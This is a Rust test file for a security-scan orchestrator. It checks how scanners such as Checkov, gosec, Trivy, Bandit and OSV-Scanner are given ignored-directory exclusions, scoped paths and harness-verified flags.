fn a_scoped_checkov_run_leaves_secrets_to_gitleaks_by_the_same_rule() {
    for (gitleaks, flag) in [(true, &["--skip-framework", "secrets"][..]), (false, &[][..])] {
        let w = World::new(PROJECT);
        w.stub("checkov", 0);
        if gitleaks {
            w.stub("gitleaks", 0);
        }
        let scope = super::resolve_scope(&w.root, &strings(&["infra/main.tf", "app"])).unwrap();
        w.open().unwrap().scan_in(&Selection::Only(strings(&["checkov"])), Some(&scope)).unwrap();
        let tails = checkov_tails(&w);
        let with = |kind: &[&str]| {
            let mut argv = strings(&["--soft-fail", "--quiet"]);
            argv.extend(strings(flag));
            argv.extend(strings(&["--skip-path", ".logos"]));
            argv.extend(strings(kind));
            argv
        };
        assert_eq!(tails, [with(&["--file", "infra/main.tf"]), with(&["--directory", "app"])], "gitleaks installed: {gitleaks}");
    }
}

/// S-813: the flag is Checkov's alone — rendering every template with
/// Gitleaks running adds `--skip-framework` to no other scanner.
#[test]
fn only_checkovs_template_carries_the_secrets_skip() {
    let fill = Fill {
        out: Path::new("/out"),
        extra: &[],
        scope: None,
        language: "",
        database: Path::new(""),
        pinned_config: Path::new("/pinned"),
        ignored: &[],
        targets: &Targets::Root,
        root: None,
        nvd_key_file: None,
        gitleaks_runs: true,
    };
    for s in &REGISTRY {
        let carries = s.render(s.run, &fill).iter().any(|a| a == "--skip-framework");
        assert_eq!(carries, s.name == "checkov", "{}", s.name);
    }
    let off = Fill { gitleaks_runs: false, ..fill };
    for s in &REGISTRY {
        assert!(s.render(s.run, &off).iter().all(|a| a != "--skip-framework"), "{}", s.name);
    }
}

/// The `[security]` gate reads a scanner fresh exactly when `status` does: a
/// stale state of any kind — a scoped-only snapshot included — is stale with
/// its reason, never fresh ([FR-SC-10], [FR-SC-17]).
///
/// [FR-SC-10]: ../../../docs/specs/requirements/FR-SC-10.md
/// [FR-SC-17]: ../../../docs/specs/requirements/FR-SC-17.md
#[test]
fn the_gate_reads_every_stale_state_stale_with_its_reason() {
    use super::{ScanState, StaleBecause};
    use crate::governance::security::ScanFreshness;
    let stale = |because| ScanState::Stale {
        because,
        snapshot_head: "0123456789abcdef".to_string(),
        version: "1".to_string(),
        findings: 1,
        suppressed: 0,
        not_fresh: 0,
        test: 2,
        dev: 6,
        needs_review: 4,
        merged: 0,
    };
    // Its counts never move the gate: test code, a dev-only dependency's finding and a needs-review finding read as any other (BR-98, BR-100, BR-101).
    let fresh = ScanState::Fresh {
        snapshot_head: "h".to_string(),
        version: "1".to_string(),
        findings: 0,
        suppressed: 0,
        not_fresh: 0,
        test: 3,
        dev: 7,
        needs_review: 5,
        merged: 0,
    };
    let cases = [
        (fresh, ScanFreshness::Fresh),
        (stale(StaleBecause::HeadMoved), ScanFreshness::Stale("HEAD moved since 0123456789ab".to_string())),
        (stale(StaleBecause::FilesChanged), ScanFreshness::Stale("a file it scanned changed".to_string())),
        (stale(StaleBecause::ScopedOnly), ScanFreshness::Stale("only a scoped scan is stored".to_string())),
        (ScanState::NeverRun, ScanFreshness::NeverRun),
        (ScanState::NotInstalled, ScanFreshness::NotInstalled),
        (ScanState::Disabled, ScanFreshness::Disabled),
    ];
    for (state, want) in cases {
        assert_eq!(super::gate::freshness_of(&state), want, "{state:?}");
    }
}

/// gosec is given each package once: two files of one package name it once,
/// so the package is never loaded twice and no result is reported twice.
#[test]
fn two_files_of_one_go_package_name_the_package_once() {
    let gosec = scanner("gosec").unwrap();
    let scope = [
        ScopedPath { rel: "cmd/server/main.go".to_string(), is_dir: false },
        ScopedPath { rel: "cmd/server/routes.go".to_string(), is_dir: false },
        ScopedPath { rel: "main.go".to_string(), is_dir: false },
    ];
    let fill = Fill {
        out: Path::new("/r/.logos/security/gosec.sarif"),
        extra: &[],
        scope: Some(&scope),
        language: "",
        database: Path::new(""),
        pinned_config: Path::new(""),
        ignored: &[],
        targets: &Targets::Root,
        root: None,
        nvd_key_file: None,
        gitleaks_runs: false,
    };
    let argv = gosec.render(gosec.run, &fill);
    let at = argv.iter().position(|a| a == "-quiet").unwrap() + 1;
    assert_eq!(argv[at..], [OsString::from("./cmd/server"), OsString::from(".")]);
}

/// The ignored directories as each scanner's own exclusion flag takes them,
/// after any `.logos` it already excluded and before the user's extra flags
/// (HF-5): a repeated flag for Trivy, Checkov, Dependency-Check and gosec
/// (S-773), one comma list for Bandit, whose repeated `--exclude` keeps only
/// the last. The scanners that take none — and every run on named paths —
/// render exactly as with nothing ignored.
#[test]
fn ignored_directories_reach_each_scanners_exclusion_flag() {
    let ignored = strings(&["notes", "target", "web/dist"]);
    let extra = strings(&["--user-flag"]);
    let base = Fill {
        out: Path::new("/r/.logos/security/x.sarif"),
        extra: &extra,
        scope: None,
        language: "python",
        database: Path::new("/db"),
        pinned_config: Path::new("/r/.logos/security/empty-config.yaml"),
        ignored: &[],
        targets: &Targets::Root,
        root: Some("/r"),
        nvd_key_file: None,
        gitleaks_runs: false,
    };
    let with = Fill { ignored: &ignored, ..base };
    let expected: &[(&str, &[&str])] = &[
        (
            "trivy",
            &[
                "--skip-dirs", ".logos", "--skip-dirs", "notes", "--skip-dirs", "target", "--skip-dirs",
                "web/dist",
            ],
        ),
        ("bandit", &["--exclude", "./.logos,./notes,./target,./web/dist"]),
        (
            "gosec",
            &["-exclude-dir", "^notes(/|$)", "-exclude-dir", "^target(/|$)", "-exclude-dir", "^web/dist(/|$)"],
        ),
        (
            "checkov",
            &[
                "--skip-path", ".logos", "--skip-path", r"^(\./|/r/)?notes(/|$)", "--skip-path",
                r"^(\./|/r/)?target(/|$)", "--skip-path", r"^(\./|/r/)?web/dist(/|$)",
            ],
        ),
        (
            "dependency-check",
            &["--exclude", "**/.logos/**", "--exclude", "notes/**", "--exclude", "target/**", "--exclude", "web/dist/**"],
        ),
    ];
    let flagged: Vec<&str> = REGISTRY.iter().filter(|s| s.takes_exclusion_flag()).map(|s| s.name).collect();
    assert_eq!(flagged, ["trivy", "bandit", "gosec", "checkov", "dependency-check"]);
    for s in &REGISTRY {
        let plain: Vec<String> = s.render(s.run, &base).iter().map(|a| a.to_string_lossy().into_owned()).collect();
        let argv: Vec<String> = s.render(s.run, &with).iter().map(|a| a.to_string_lossy().into_owned()).collect();
        let Some((_, want)) = expected.iter().find(|(n, _)| *n == s.name) else {
            assert_eq!(argv, plain, "{} takes no ignored directories", s.name);
            continue;
        };
        let at = argv.iter().position(|a| a == want[0]).unwrap_or_else(|| panic!("{}: {argv:?}", s.name));
        assert_eq!(argv.get(at..at + want.len()), Some(&strings(want)[..]), "{}'s exclusions", s.name);
        let user = argv.iter().position(|a| a == "--user-flag").unwrap();
        assert!(user >= at + want.len(), "{}: the user's extra flags come after Logos' own: {argv:?}", s.name);
        // Everything else is the argv with nothing ignored: the exclusions
        // follow the `.logos` pair (Bandit's extend its one value in place),
        // or, for gosec, which excludes no `.logos`, stand where it would.
        let pair = if plain[at] == want[0] { 2 } else { 0 };
        let added = want.len() - pair;
        let mut rebuilt = plain.clone();
        rebuilt.splice(at..at + pair, want.iter().map(|w| (*w).to_string()));
        assert_eq!(argv, rebuilt, "{}: only the exclusions are added", s.name);
        assert_eq!(argv.len(), plain.len() + added, "{}", s.name);
        // A run on named paths reads exactly those, ignored or not.
        if s.path_slot.is_some() {
            let scope = [ScopedPath { rel: "notes/keep.py".to_string(), is_dir: false }];
            assert_eq!(
                s.render(s.run, &Fill { scope: Some(&scope), ..with }),
                s.render(s.run, &Fill { scope: Some(&scope), ..base }),
                "{}'s scoped run is unchanged",
                s.name
            );
        }
    }
}

/// Checkov's expression skips the ignored directory and what is below it as
/// its runners join them to `.` or, for the Terraform and SAST runners, to the
/// absolute root — and no path that merely contains the name.
#[test]
fn checkovs_skip_expression_matches_the_directory_and_not_its_near_misses() {
    let checkov = scanner("checkov").unwrap();
    let ignored = strings(&["notes", "web/dist"]);
    let fill = Fill {
        out: Path::new("/o"),
        extra: &[],
        scope: None,
        language: "",
        database: Path::new(""),
        pinned_config: Path::new(""),
        ignored: &ignored,
        targets: &Targets::Root,
        root: Some("/srv/my.app"),
        nvd_key_file: None,
        gitleaks_runs: false,
    };
    let argv = checkov.render(checkov.run, &fill);
    let patterns: Vec<regex::Regex> = argv
        .windows(2)
        .filter(|w| w[0] == "--skip-path" && w[1] != ".logos")
        .map(|w| regex::Regex::new(w[1].to_str().unwrap()).unwrap())
        .collect();
    assert_eq!(patterns.len(), 2);
    let skipped = |path: &str| patterns.iter().any(|p| p.is_match(path));
    for path in [
        "./notes", "./notes/a.tf", "notes", "./web/dist", "./web/dist/x/main.tf", "/srv/my.app/notes",
        "/srv/my.app/web/dist/main.tf",
    ] {
        assert!(skipped(path), "{path} is skipped");
    }
    for path in [
        "./src/notes", "./notesy", "./xnotes/a.tf", "./web/distro", "./webxdist", "./web/src/dist",
        "/srv/my.app/src/notes", "/srv/myxapp/notes", "/other/srv/my.app/notes", "/srv/my.app/notesy",
    ] {
        assert!(!skipped(path), "{path} is not skipped");
    }
    // The value is never a substring of a path, which Checkov also skips on.
    assert!(patterns.iter().all(|p| p.as_str().starts_with('^')));
}

/// Whether gosec 2.21 skips the package in `dir` (relative to `.`, as its
/// walk of `./...` spells it) given these `-exclude-dir` values: each value,
/// every `/` in it escaped and wrapped as `([\\/])?<value>([\\/])?`, is
/// searched in the directory (its `helpers.go`).
fn gosec_skips(values: &[String], dir: &str) -> bool {
    values.iter().any(|v| {
        let wrapped = format!(r"([\\/])?{}([\\/])?", v.replace('/', r"\/"));
        regex::Regex::new(&wrapped).unwrap().is_match(dir)
    })
}

/// The `-exclude-dir` values of a gosec argv.
fn exclude_dirs(argv: &[String]) -> Vec<String> {
    argv.windows(2).filter(|w| w[0] == "-exclude-dir").map(|w| w[1].clone()).collect()
}

/// gosec's tree expression, as gosec applies it, skips the ignored directory
/// and every directory below it — the harness's `target/nested/`, which
/// `^target$` does not reach — and no directory that merely contains the
/// name, its characters escaped (S-773).
#[test]
fn gosecs_tree_expression_skips_the_directory_and_below_and_not_its_near_misses() {
    let gosec = scanner("gosec").unwrap();
    let ignored = strings(&["target", "web/dist", "my.app", "c++(1)"]);
    let fill = Fill {
        out: Path::new("/o"),
        extra: &[],
        scope: None,
        language: "",
        database: Path::new(""),
        pinned_config: Path::new(""),
        ignored: &ignored,
        targets: &Targets::Root,
        root: Some("/srv/project"),
        nvd_key_file: None,
        gitleaks_runs: false,
    };
    let argv: Vec<String> = gosec.render(gosec.run, &fill).iter().map(|a| a.to_string_lossy().into_owned()).collect();
    let values = exclude_dirs(&argv);
    assert_eq!(values.len(), ignored.len(), "{argv:?}");
    for dir in [
        "target", "target/nested", "target/a/b", "web/dist", "web/dist/x", "my.app", "my.app/x", "c++(1)", "c++(1)/y",
    ] {
        assert!(gosec_skips(&values, dir), "{dir} is skipped");
    }
    for dir in [
        "pkg/mytarget", "src/target", "src/target/nested", "targets", "mytarget", "target2", "web/distro",
        "web/src/dist", "x/web/dist", "myxapp", "my.apps", "c(1)", "cc(1)", ".",
    ] {
        assert!(!gosec_skips(&values, dir), "{dir} stays scanned");
    }
    // Relative to `.`: the root is never spelled into a value, as Checkov's is.
    assert!(values.iter().all(|v| v.starts_with('^') && !v.contains("srv")), "{values:?}");
}

/// gosec reads `excluded` only when its argv carries every ignored directory:
/// a list that fills the budget exactly is passed whole, and one past it is
/// cut — the coverage fact names the count `render` left out (S-773, BR-97).
#[test]
fn gosec_reads_excluded_only_when_every_ignored_directory_fits_the_budget() {
    use super::registry::IGNORED_ARGV_BUDGET;
    let gosec = scanner("gosec").unwrap();
    // `-exclude-dir`, `^dir_00000000(/|$)` and a NUL after each: 32 bytes.
    let per = "-exclude-dir".len() + "^dir_00000000(/|$)".len() + 2;
    assert_eq!(IGNORED_ARGV_BUDGET % per, 0, "values of one length fill the budget exactly");
    let fits = IGNORED_ARGV_BUDGET / per;
    for (n, cut) in [(fits, 0), (fits + 1, 1), (fits + 3, 3)] {
        let dirs: Vec<String> = (0..n).map(|i| format!("dir_{i:08}")).collect();
        let fill = Fill {
            out: Path::new("/o"),
            extra: &[],
            scope: None,
            language: "",
            database: Path::new(""),
            pinned_config: Path::new(""),
            ignored: &dirs,
            targets: &Targets::Root,
            root: Some("/srv/project"),
            nvd_key_file: None,
            gitleaks_runs: false,
        };
        let argv: Vec<String> = gosec.render(gosec.run, &fill).iter().map(|a| a.to_string_lossy().into_owned()).collect();
        assert_eq!(exclude_dirs(&argv).len(), n - cut, "{n} ignored: what the argv carries");
        let ignores = Ignores { dirs, misread: 0, targets: Targets::Paths(strings(&["src"])) };
        let want = match cut {
            0 => Coverage::EXCLUDED,
            1 => Coverage::scanned(CoverageKind::Partial, "it is not given 1 ignored directory past the 64 KiB argument budget".to_string()),
            n => Coverage::scanned(CoverageKind::Partial, format!("it is not given {n} ignored directories past the 64 KiB argument budget")),
        };
        assert_eq!(gosec.coverage(&ignores), want, "{n} ignored");
    }
}

/// S-773 on a fixture: a whole-project scan gives gosec one tree expression
/// for the ignored `target/` and none for a near miss, so — read as gosec
/// reads it — the packages in `target/` and `target/nested/` are skipped
/// while `pkg/mytarget/`, `src/target/` and `targets/` stay scanned, and the
/// outcome reads `excluded`. Nothing is written into the project outside
/// `.logos/`, and a scoped re-scan of the ignored directory still reads it
/// ([FR-SC-26] AC 4).
///
/// [FR-SC-26]: ../../../docs/specs/requirements/FR-SC-26.md
#[test]
fn gosec_skips_the_ignored_tree_and_keeps_pkg_mytarget_and_src_target_scanned() {
    let go = "package x\n";
    let w = World::new(&[
        (".gitignore", "/target/\n"),
        ("go.mod", "module example.com/fixture\n"),
        ("app/main.go", go),
        ("target/gen.go", go),
        ("target/nested/gen.go", go),
        ("pkg/mytarget/lib.go", go),
        ("src/target/lib.go", go),
        ("targets/lib.go", go),
    ]);
    w.stub("gosec", 0);
    let before = tree_outside_logos(&w.root);
    let report = w.scan(&Selection::Only(strings(&["gosec"])));
    let o = outcome(&report, "gosec");
    assert!(matches!(o.outcome, Outcome::Ran { .. }), "{o:?}");
    assert_eq!(o.coverage, Some(Coverage::EXCLUDED));
    let runs = w.runs("gosec");
    assert_eq!(runs.len(), 1, "{runs:?}");
    let values = exclude_dirs(&runs[0]);
    assert_eq!(values, strings(&["^target(/|$)"]), "one expression, for the ignored directory alone");
    let packages = ["app", "target", "target/nested", "pkg/mytarget", "src/target", "targets"];
    let scanned: Vec<&str> = packages.into_iter().filter(|d| !gosec_skips(&values, d)).collect();
    assert_eq!(scanned, ["app", "pkg/mytarget", "src/target", "targets"]);
    assert_eq!(tree_outside_logos(&w.root), before, "nothing is written into the project");

    // Trivy has no path position and runs whole, so the ignored set is walked
    // for this scoped scan too: gosec must still pass none of it.
    w.stub("trivy", 0);
    fs::remove_dir_all(&w.rec).unwrap();
    fs::create_dir_all(&w.rec).unwrap();
    let scope = super::resolve_scope(&w.root, &strings(&["target"])).unwrap();
    let scoped = w.open().unwrap().scan_in(&Selection::Only(strings(&["gosec", "trivy"])), Some(&scope)).unwrap();
    assert!(w.runs("trivy")[0].iter().any(|a| a == "target"), "the ignored set was walked: {:?}", w.runs("trivy"));
    let runs = w.runs("gosec");
    assert_eq!(runs.len(), 1, "{runs:?}");
    assert!(runs[0].ends_with(&strings(&["-quiet", "./target/..."])), "scoped gosec reads target/: {:?}", runs[0]);
    assert_eq!(outcome(&scoped, "gosec").coverage, None, "a scoped run states no coverage");
}

/// CodeQL has no harness evidence — it was not installed when the harness
/// ran — so Logos gives it no exclusion and writes no config for one: its
/// argv names no ignored directory and no config, nothing is written into the
/// project outside `.logos/`, and its outcome reads `scanned` with its note
/// (S-773).
#[test]
fn codeql_takes_no_unproven_exclusion_writes_no_config_and_says_it_read_the_ignored_files() {
    let w = World::new(&[(".gitignore", "/target/\n"), ("app/main.py", "import os\n"), ("target/gen.py", "x\n")]);
    w.stub("codeql", 0);
    let before = tree_outside_logos(&w.root);
    let report = w.scan(&Selection::Only(strings(&["codeql"])));
    let o = outcome(&report, "codeql");
    assert!(matches!(o.outcome, Outcome::Ran { .. }), "{o:?}");
    let codeql = scanner("codeql").unwrap();
    let note = "no exclusion is proven for it, so its database holds the ignored directories' files";
    assert_eq!(o.coverage, Some(Coverage::scanned(CoverageKind::Unproven, note.to_string())), "the disclosure, word for word");
    assert_eq!(codeql.exclusion_evidence, None);
    let runs = w.runs("codeql");
    assert_eq!(runs.len(), 2, "database create, then analyze: {runs:?}");
    for argv in &runs {
        assert!(
            !argv.iter().any(|a| a.contains("target") || a.contains("config") || a.contains("paths-ignore")),
            "{argv:?}"
        );
    }
    // Nor through the variable its extractors read.
    let lgtm = recorded(&w, "codeql", "lgtm");
    assert_eq!(lgtm.len(), 3, "the probe, database create and analyze: {lgtm:?}");
    assert!(lgtm.iter().all(String::is_empty), "LGTM_INDEX_FILTERS is never set: {lgtm:?}");
    assert_eq!(tree_outside_logos(&w.root), before, "nothing is written into the project");
}

/// The committed harness evidence, as the guards below read it.
fn harness_evidence() -> String {
    let evidence = Path::new(env!("CARGO_MANIFEST_DIR")).join("../scripts/tests/fixtures/scanner-exclusions/verdicts.tsv");
    fs::read_to_string(&evidence).expect("the committed harness evidence")
}

/// The rows of [`harness_evidence`], split on tabs, after the header that
/// names the columns every guard indexes by position.
fn harness_rows(tsv: &str) -> Vec<Vec<&str>> {
    let mut lines = tsv.lines();
    assert_eq!(
        lines.next(),
        Some("scanner\tversion\tfixture\tmechanism\tstatus\tignored\tnear_miss\thits\tnote\targv"),
        "the columns read below"
    );
    lines.map(|l| l.split('\t').collect()).collect()
}

/// The version of gosec's committed harness rows while the owner's re-run on
/// the manifest's pin is pending (S-782): the pin moved to the release built
/// for Go 1.27, and the harness is the owner's to run at Phase 5, so the rows
/// still read the version it last ran. Only gosec rows at exactly this version
/// are let through — the argv and the verdict are still checked on them — and
/// the test fails once the re-run writes rows at the pin, until this constant
/// and its allowance are deleted with that commit.
const HARNESS_RERUN_PENDING_FROM: &str = "2.21.4";

/// Every exclusion flag the registry calls proven is the argv its committed
/// harness rows ran, on the version the tool manifest pins, and those rows
/// show it skipping the ignored directory — `target/nested/` included — and
/// keeping both near misses in all three checkout shapes ([FR-SC-26] AC 1,
/// BR-97). A change to the template, the spelling or the pin that the
/// harness has not re-run fails here, except the pin move
/// [`HARNESS_RERUN_PENDING_FROM`] names.
///
/// [FR-SC-26]: ../../../docs/specs/requirements/FR-SC-26.md
#[test]
fn a_proven_exclusion_flag_is_the_argv_its_committed_harness_rows_ran() {
    let tsv = harness_evidence();
    let rows = harness_rows(&tsv);
    let proven: Vec<_> = REGISTRY.iter().filter(|s| s.exclusion_evidence.is_some()).collect();
    assert_eq!(proven.iter().map(|s| s.name).collect::<Vec<_>>(), ["gosec"]);
    let ignored = strings(&["target"]);
    for s in proven {
        let mechanism = s.exclusion_evidence.unwrap();
        let pin = &crate::tools::Manifest::builtin().tool(s.name).expect("a managed scanner").version;
        let fill = Fill {
            out: Path::new("<run>/out.sarif"),
            extra: &[],
            scope: None,
            language: "",
            database: Path::new(""),
            pinned_config: Path::new(""),
            ignored: &ignored,
            targets: &Targets::Root,
            root: None,
            nvd_key_file: None,
            gitleaks_runs: false,
        };
        let argv: Vec<String> = s.render(s.run, &fill).iter().map(|a| a.to_string_lossy().into_owned()).collect();
        let argv = argv.join(" ");
        let mine: Vec<&Vec<&str>> = rows.iter().filter(|r| r[0] == s.name && r[3] == mechanism).collect();
        assert_eq!(mine.iter().map(|r| r[2]).collect::<Vec<_>>(), ["git", "worktree", "non-git"], "{}: {mechanism}", s.name);
        let versions: std::collections::BTreeSet<&str> = mine.iter().map(|r| r[1]).collect();
        assert_eq!(versions.len(), 1, "{}: one run's rows, one version: {versions:?}", s.name);
        let mut pending = 0;
        for r in mine {
            assert!(
                r[1] == pin || (s.name == "gosec" && r[1] == HARNESS_RERUN_PENDING_FROM),
                "{}: the row ran the pin ({pin}), or the version whose re-run is pending: {r:?}",
                s.name
            );
            pending += usize::from(r[1] != pin);
            assert!(r[4].starts_with("ran (exit "), "{}: {r:?}", s.name);
            assert_eq!((r[5], r[6]), ("ignored skipped", "near miss kept"), "{}: {r:?}", s.name);
            assert_eq!(r[9], argv, "{}: the row ran this template's argv", s.name);
        }
        assert!(
            pending > 0,
            "{}: the committed rows are at the pin {pin}: delete HARNESS_RERUN_PENDING_FROM and its allowance",
            s.name
        );
    }
}

/// The version of OSV-Scanner's committed harness rows while the owner's re-run
/// on the manifest's pin is pending (S-779): the pin moved to 2.7.0, whose
/// dependency extraction (osv-scalibr) the 1.9.2 evidence does not cover, and
/// the harness is the owner's to run at Phase 5, so its six rows still read the
/// version it last ran. Only rows at exactly this version are let through, the
/// argv tail and the verdicts are still checked on them, and the test fails
/// once the re-run writes rows at the pin, until this constant, its allowance
/// and the `--experimental-*` probe branch are deleted with that commit. If
/// that run does not prove the six legs the manifest commit is reverted instead.
const OSV_RERUN_PENDING_FROM: &str = "1.9.2";

/// OSV-Scanner is given the unignored paths as targets ([`Arg::Unignored`]),
/// and the committed harness rows of that mechanism show it skipping the
/// ignored directory and keeping both near misses in all three checkout shapes
/// ([FR-SC-26] AC 1, BR-97). The registry's tail after `--recursive` is the one
/// each `explicit-targets` row ran, the probe's own flags are the spelling of
/// the version that row ran (the `--experimental-*` pair before 2.0, `--offline`
/// and `--all-packages` from it), and the rows are at the manifest's pin or at
/// the version whose re-run is pending ([`OSV_RERUN_PENDING_FROM`]) — the rows
/// that await the owner's run are counted and named in the output, never made
/// to pass by editing them.
///
/// [FR-SC-26]: ../../../docs/specs/requirements/FR-SC-26.md
#[test]
fn osv_scanners_unignored_targets_are_the_argv_tail_its_committed_harness_rows_ran() {
    let tsv = harness_evidence();
    let rows: Vec<Vec<&str>> = harness_rows(&tsv).into_iter().filter(|r| r[0] == "osv-scanner").collect();
    let s = scanner("osv-scanner").unwrap();
    let pin = &crate::tools::Manifest::builtin().tool("osv-scanner").expect("a managed scanner").version;
    let paths = strings(&[".gitignore", "app", "go.mod", "src", "targets"]);
    let fill = Fill {
        out: Path::new("<run>/out.sarif"),
        extra: &strings(&["--user-extra"]),
        scope: None,
        language: "",
        database: Path::new(""),
        pinned_config: Path::new(""),
        ignored: &strings(&["target"]),
        targets: &Targets::Paths(paths.clone()),
        root: None,
        nvd_key_file: None,
        gitleaks_runs: false,
    };
    let argv: Vec<String> = s.render(s.run, &fill).iter().map(|a| a.to_string_lossy().into_owned()).collect();
    let tail = argv[argv.iter().position(|a| a == "--recursive").expect("the template recurses")..].join(" ");
    assert_eq!(tail, "--recursive .gitignore app go.mod src targets");
    assert_eq!(
        argv,
        strings(&[
            "--format", "sarif", "--output-file", "<run>/out.sarif", "--user-extra", "--recursive", ".gitignore", "app", "go.mod", "src",
            "targets"
        ]),
        "the 2.x spelling, the user's extra arguments before the positionals"
    );

    let legs: Vec<(&str, &str)> = rows.iter().map(|r| (r[3], r[2])).collect();
    assert_eq!(
        legs,
        [
            ("template", "git"),
            ("explicit-targets", "git"),
            ("template", "worktree"),
            ("explicit-targets", "worktree"),
            ("template", "non-git"),
            ("explicit-targets", "non-git")
        ],
        "the six legs: two mechanisms in each of three checkout shapes"
    );
    let versions: std::collections::BTreeSet<&str> = rows.iter().map(|r| r[1]).collect();
    assert_eq!(versions.len(), 1, "one run's rows, one version: {versions:?}");
    let version = *versions.iter().next().unwrap();
    assert!(
        version == pin || version == OSV_RERUN_PENDING_FROM,
        "the rows ran the pin ({pin}), or the version whose re-run is pending ({OSV_RERUN_PENDING_FROM}): {version}"
    );
    let probe = if version.starts_with("1.") {
        "--format json --experimental-offline --experimental-all-packages"
    } else {
        "--format json --offline --all-packages"
    };
    for r in rows.iter().filter(|r| r[3] == "explicit-targets") {
        assert!(r[4].starts_with("ran (exit "), "{r:?}");
        assert_eq!((r[5], r[6]), ("ignored skipped", "near miss kept"), "{r:?}");
        assert_eq!(r[9], format!("{probe} {tail}"), "the row ran this template's targets: {r:?}");
    }
    for r in rows.iter().filter(|r| r[3] == "template") {
        assert_eq!(r[9], format!("{probe} --recursive ."), "{r:?}");
    }
    let pending = rows.iter().filter(|r| r[1] != pin.as_str()).count();
    eprintln!("OWNER-PENDING: {pending} of {} osv-scanner harness rows read {version}, the pin is {pin}", rows.len());
    assert!(
        pending > 0,
        "osv-scanner: the committed rows are at the pin {pin}: delete OSV_RERUN_PENDING_FROM and its allowance"
    );
}

/// Every file under `root` but `.logos/`, with its bytes, sorted.
fn tree_outside_logos(root: &Path) -> Vec<(PathBuf, Vec<u8>)> {
    let mut files = Vec::new();
    let mut dirs = vec![root.to_path_buf()];
    while let Some(dir) = dirs.pop() {
        for entry in fs::read_dir(&dir).unwrap().flatten() {
            let path = entry.path();
            if path == root.join(".logos") {
                continue;
            }
            if entry.file_type().unwrap().is_dir() {
                dirs.push(path);
            } else {
                files.push((path.clone(), fs::read(&path).unwrap()));
            }
        }
    }
    files.sort();
    files
}

/// Run `git` in `dir` for a fixture: never above the fixture, no maintenance.
fn fixture_git(dir: &Path, ceiling: &Path, args: &[&str]) {
    let status = std::process::Command::new("git")
        .args(["-c", "maintenance.auto=false", "-c", "gc.auto=0", "-c", "init.defaultBranch=main"])
        .args(args)
        .current_dir(dir)
        .env("GIT_CEILING_DIRECTORIES", ceiling)
        .status()
        .expect("git runs");
    assert!(status.success(), "git {args:?}");
}

/// A git project with ignored trees — beside a hidden directory and a
/// directory symlink that are not ignored: a build directory, a hidden one, a
/// nested ignore file's, a `.ignore` file's, `.git/info/exclude`'s, and one of
/// each name an exclusion flag would misread.
fn ignoring_world() -> World {
    let w = World::new(&[
        (".gitignore", "target/\nnotes/\n.agents/\n*.log\na,b/\nctl*/\n*x/\n"),
        (".ignore", "scratch/\n"),
        ("src/main.rs", "fn main() {}\n"),
        ("src/main.go", "package main\n"),
        ("src/app.py", "import os\n"),
        ("build.log", "x\n"),
        ("target/debug/deps/libx.rlib", "x"),
        ("notes/old/draft.py", "import pickle\n"),
        (".agents/skills/x.py", "import pickle\n"),
        ("web/.gitignore", "dist/\n"),
        ("a/.gitignore", "build/\n"),
        ("a/build/out.py", "x"),
        ("web/dist/bundle.js", "x"),
        ("web/src/app.js", "x"),
        ("scratch/a.py", "x"),
        ("local/a.py", "x"),
        ("a,b/c.py", "x"),
        ("ctl\nsrc/c.py", "x"),
        ("-x/c.py", "x"),
        ("q\"x/c.py", "x"),
        ("g*x/c.py", "x"),
        ("g?x/c.py", "x"),
        ("g[x/c.py", "x"),
        ("g]x/c.py", "x"),
        ("g{x/c.py", "x"),
        ("g}x/c.py", "x"),
        ("b\\x/c.py", "x"),
        (".github/workflows/ci.yml", "x"),
        (".logos/cache/x.py", "x"),
    ]);
    let ceiling = w.root.parent().unwrap().to_path_buf();
    fixture_git(&w.root, &ceiling, &["init", "-q"]);
    fs::write(w.root.join(".git/info/exclude"), "local/\n").unwrap();
    // An ignore file above the root is not the project's.
    fs::write(ceiling.join(".gitignore"), "src/\nweb/\n").unwrap();
    // A committed symlink to a directory outside the root is neither listed
    // nor walked into: the ignore file there would name `linked/gen`.
    let outside = ceiling.join("outside");
    fs::create_dir_all(outside.join("gen")).unwrap();
    fs::write(outside.join(".gitignore"), "gen/\n").unwrap();
    std::os::unix::fs::symlink(&outside, w.root.join("linked")).unwrap();
    w
}

#[test]
fn the_ignored_directories_are_the_top_most_ones_the_project_itself_ignores() {
    let w = ignoring_world();
    let ignores = super::project_ignores(&w.root);
    assert_eq!(
        ignores.dirs,
        strings(&[".agents", "local", "notes", "scratch", "target", "a/build", "web/dist"]),
        "top-most only, shallowest first, never a file, never .git or .logos, never a misreadable name"
    );
    // a,b  ctl\nsrc  -x  q"x  g*x  g?x  g[x  g]x  g{x  g}x  b\x
    assert_eq!(ignores.misread, 11, "each misreadable name is counted, not passed");
    // Every walked path and no ignored directory, whatever its name: `a` and
    // `web` hold one and are opened; the ignored file `build.log` is left out
    // with them, and so is the symlink `linked`, which no target names.
    assert_eq!(
        ignores.targets,
        Targets::Paths(strings(&[".github", ".gitignore", ".ignore", "a/.gitignore", "src", "web/.gitignore", "web/src"])),
    );
    // The same project reached through a symlink.
    let link = w.root.parent().unwrap().join("link");
    std::os::unix::fs::symlink(&w.root, &link).unwrap();
    assert_eq!(super::project_ignores(&link), ignores, "a symlinked root");
    let w = World::new(&[("src/a.py", "")]);
    assert_eq!(super::project_ignores(&w.root), Ignores::NONE, "nothing ignored, nothing excluded, `.` targeted");
}

/// A full scan hands every excluding scanner the project's ignored
/// directories; a scoped one keeps a path-capable scanner on the named paths
/// alone while a whole-project scanner still leaves them out. The stubs are
/// the whole search path and there is no tools directory, so no scanner on
/// this machine can run.
#[test]
fn a_full_scan_keeps_every_scanner_out_of_the_projects_ignored_directories() {
    let w = ignoring_world();
    w.all_stubs();
    w.user_config("[security_scan.trivy]\nextra_args = [\"--timeout\", \"1m\"]\n");
    let orchestrator = w.open().unwrap();
    for state in orchestrator.detect() {
        let Detection::Installed { binary, .. } = state.detection else { panic!("{state:?}") };
        assert!(binary.starts_with(&w.bin), "{} is the stub: {}", state.scanner, binary.display());
    }
    let report = orchestrator.scan(&Selection::All).unwrap();
    assert!(report.outcomes.iter().all(|o| matches!(o.outcome, Outcome::Ran { .. })), "{report:?}");
    let dirs = [".agents", "local", "notes", "scratch", "target", "a/build", "web/dist"];
    let pairs = |flag: &str, values: Vec<String>| -> Vec<String> {
        values.into_iter().flat_map(|v| [flag.to_string(), v]).collect()
    };
    let run = |name: &str| -> Vec<String> {
        let runs = w.runs(name);
        assert_eq!(runs.len(), 1, "{name} ran once");
        runs.into_iter().next().unwrap()
    };
    let contains = |argv: &[String], want: &[String]| argv.windows(want.len()).any(|w| w == want);

    let trivy = run("trivy");
    let mut want = strings(&["--skip-dirs", ".logos"]);
